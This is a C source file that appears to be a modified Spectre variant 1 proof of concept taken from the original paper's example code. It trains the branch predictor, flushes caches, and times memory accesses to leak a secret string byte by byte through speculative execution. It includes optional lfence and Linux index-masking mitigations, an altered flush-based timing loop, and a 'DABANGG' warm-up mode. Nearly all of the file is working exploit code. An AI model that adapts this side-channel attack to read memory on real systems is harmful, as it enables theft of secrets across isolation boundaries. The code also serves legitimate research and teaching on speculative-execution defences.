/*********************************************************************
*
* Spectre PoC
*
* This source code originates from the example code provided in the 
* "Spectre Attacks: Exploiting Speculative Execution" paper found at
* https://spectreattack.com/spectre.pdf
*
* Minor modifications have been made to fix compilation errors and
* improve documentation where possible.
*
**********************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtsc, rdtscp, clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#endif /* ifdef _MSC_VER */

/* Automatically detect if SSE2 is not available when SSE is advertized */
#ifdef _MSC_VER
/* MSC */
#if _M_IX86_FP==1
#define NOSSE2
#endif
#else
/* Not MSC */
#if defined(__SSE__) && !defined(__SSE2__)
#define NOSSE2
#endif
#endif /* ifdef _MSC_VER */

#ifdef NOSSE2
#define NORDTSCP
#define NOMFENCE
#define NOCLFLUSH
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

// char * secret = "The Magic Words are Squeamish Ossifrage.";
char * secret = "HELP ME PLEASE. A MAN NEEDS HIS NUGGS....If only Bradley's arm was longer. Best photo ever. #oscars....Always in my heart @Harry_Styles . Yours sincerely, Louis";
uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

#ifdef LINUX_KERNEL_MITIGATION
/* From https://github.com/torvalds/linux/blob/cb6416592bc2a8b731dabcec0d63cda270764fc6/arch/x86/include/asm/barrier.h#L27 */
/**
 * array_index_mask_nospec() - generate a mask that is ~0UL when the
 * 	bounds check succeeds and 0 otherwise
 * @index: array element index
 * @size: number of elements in array
 *
 * Returns:
 *     0 - (index < size)
 */
static inline unsigned long array_index_mask_nospec(unsigned long index,
		unsigned long size)
{
	unsigned long mask;

	__asm__ __volatile__ ("cmp %1,%2; sbb %0,%0;"
			:"=r" (mask)
			:"g"(size),"r" (index)
			:"cc");
	return mask;
}
#endif

void victim_function(size_t x) {
  if (x < array1_size) {
#ifdef INTEL_MITIGATION
		/*
		 * According to Intel et al, the best way to mitigate this is to 
		 * add a serializing instruction after the boundary check to force
		 * the retirement of previous instructions before proceeding to 
		 * the read.
		 * See https://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf
		 */
		_mm_lfence();
#endif
#ifdef LINUX_KERNEL_MITIGATION
    x &= array_index_mask_nospec(x, array1_size);
#endif
    temp &= array2[array1[x] * 512];
  }
}


/********************************************************************
Analysis code
********************************************************************/
#ifdef NOCLFLUSH
#define CACHE_FLUSH_ITERATIONS 2048
#define CACHE_FLUSH_STRIDE 4096
uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];

/* Flush memory using long SSE instructions */
void flush_memory_sse(uint8_t * addr)
{
  float * p = (float *)addr;
  float c = 0.f;
  __m128 i = _mm_setr_ps(c, c, c, c);

  int k, l;
  /* Non-sequential memory addressing by looping through k by l */
  for (k = 0; k < 4; k++)
    for (l = 0; l < 4; l++)
      _mm_stream_ps(&p[(l * 4 + k) * 4], i);
}
#endif

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i;
  unsigned int junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;

#ifdef NOCLFLUSH
  int junk2 = 0;
  int l;
  (void)junk2;
#endif

  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 999; tries > 0; tries--) {

#ifndef NOCLFLUSH
    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
#else
    /* Flush array2[256*(0..255)] from cache
       using long SSE instruction several times */
    for (j = 0; j < 16; j++)
      for (i = 0; i < 256; i++)
        flush_memory_sse( & array2[i * 512]);
#endif

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
#ifndef NOCLFLUSH
      _mm_clflush( & array1_size);
#else
      /* Alternative to using clflush to flush the CPU cache */
      /* Read addresses at 4096-byte intervals out of a large array.
         Do this around 2000 times, or more depending on CPU cache size. */

      for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
        junk2 = cache_flush_array[l];
      } 
#endif

      /* Delay (can also mfence) */
      for (volatile int z = 0; z < 100; z++) {}

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      victim_function(x);

    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & array2[mix_i * 512];

    /*
    We need to accuratly measure the memory access to the current index of the
    array so we can determine which index was cached by the malicious mispredicted code.

    The best way to do this is to use the rdtscp instruction, which measures current
    processor ticks, and is also serialized.
    */

//#ifndef NORDTSCP
       //time1 = __rdtscp( & junk); /* READ TIMER */
       //_mm_clflush((void *)addr);
       //junk = * addr; /* MEMORY ACCESS TO TIME */
       //time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
       // printf("%d\n",time2);
//#else

    /*
    The rdtscp instruction was instroduced with the x86-64 extensions.
    Many older 32-bit processors won't support this, so we need to use
    the equivalent but non-serialized tdtsc instruction instead.
    */

//#ifndef NOMFENCE
      /*
      Since the rdstc instruction isn't serialized, newer processors will try to
      reorder it, ruining its value as a timing mechanism.
      To get around this, we use the mfence instruction to introduce a memory
      barrier and force serialization. mfence is used because it is portable across
      Intel and AMD.
      */
      //_mm_lfence();
     // _mm_clflush((void *)addr);
     // junk = *addr;
      _mm_mfence();
      _mm_lfence();
      time1 = __rdtsc(); /* READ TIMER */
      _mm_lfence();
      _mm_clflush((void *)addr);
      //junk = * addr; /* MEMORY ACCESS TO TIME */
      _mm_mfence();
      _mm_lfence();
      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      _mm_lfence();
      //printf("%ld\n",time2);
//#else
      /*
      The mfence instruction was introduced with the SSE2 instruction set, so
      we have to ifdef it out on pre-SSE2 processors.
      Luckily, these older processors don't seem to reorder the rdtsc instruction,
      so not having mfence on older processors is less of an issue.
      */

      // time1 = __rdtsc(); /* READ TIMER */
      // __mm_clflush((void *)addr);
      // //junk = * addr; /* MEMORY ACCESS TO TIME */
      // time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
//#endif
//#endif
      if ((int)time2 >= cache_hit_threshold && mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

/*
*  Command line arguments:
*  1: Cache hit threshold (int)
*  2: Malicious address start (size_t)
*  3: Malicious address count (int)
*/
int main(int argc,
  const char * * argv) {
  
  /* Default to a cache hit threshold of 80 */
  int cache_hit_threshold = 80;

  /* Default for malicious_x is the secret string address */
  size_t malicious_x = (size_t)(secret - (char * ) array1);
  
  /* Default addresses to read is 40 (which is the length of the secret string) */
  int len = 160; 
  int d_flag = 0;
  int score[2];
  uint8_t value[2];
  int i;

  #ifdef NOCLFLUSH
  for (i = 0; i < (int)sizeof(cache_flush_array); i++) {
    cache_flush_array[i] = 1;
  }
  #endif
  
  for (i = 0; i < (int)sizeof(array2); i++) {
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  }

  /* Parse the cache_hit_threshold from the first command line argument.
     (OPTIONAL) */
  if (argc >= 2) {
    sscanf(argv[1], "%d", &cache_hit_threshold);
  }

  /* Enable DABANGG using flag (1 => enabled)*/
  if (argc >= 3) {
    sscanf(argv[2], "%d", &d_flag);
  }

  /* Print git commit hash */
  #ifdef GIT_COMMIT_HASH
    // printf("Version: commit " GIT_COMMIT_HASH "\n");
  #endif
  
  char result[161];
  result[160] = 0;
  int iter = 0;
  // printf("Reading %d bytes:\n", len);

  if(d_flag){
    long x, y;
    x = 5;
    y = 6;
    unsigned long long max_i = 40000000;
    for (unsigned long long i = 0; i < max_i; ++i){
      _mm_clflush(&max_i);
      x *= y;
      y *=x;
      if(i%7==0){
        x = y/5;
        y = (x*9)/11;
      }
      else if(i%20==0){
        x = y%10;
        y = x%20;
      }
    }
  }
  // printf("done\n");

  /* Start the read loop to read each address */
  while (--len >= 0) {
    // printf("Reading at malicious_x = %p... ", (void * ) malicious_x);

    /* Call readMemoryByte with the required cache hit threshold and
       malicious x address. value and score are arrays that are
       populated with the results.
    */
    readMemoryByte(cache_hit_threshold, malicious_x++, value, score);

    result[iter] = (value[0] > 31 && value[0] < 127 ? value[0] : '?');
    iter++;
  }
  printf("%s\n",result);
  return (0);
}
